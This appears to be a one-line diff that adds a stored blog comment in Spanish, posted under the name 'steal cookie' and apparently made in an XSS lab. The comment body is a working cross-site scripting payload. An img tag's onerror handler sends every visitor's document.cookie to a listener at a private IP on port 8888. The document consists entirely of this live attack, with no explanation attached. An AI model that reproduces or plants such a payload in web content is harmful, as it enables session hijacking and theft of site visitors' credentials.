@@ -1,0 +1,1 @@
+<div class='comment'><h4>Comentario de steal cookie el June 19, 2023, 3:52 pm:</h4><p><img src=x onerror="this.src='http://192.168.226.128:8888/?'+document.cookie; this.removeAttribute('onerror');"></p></div>
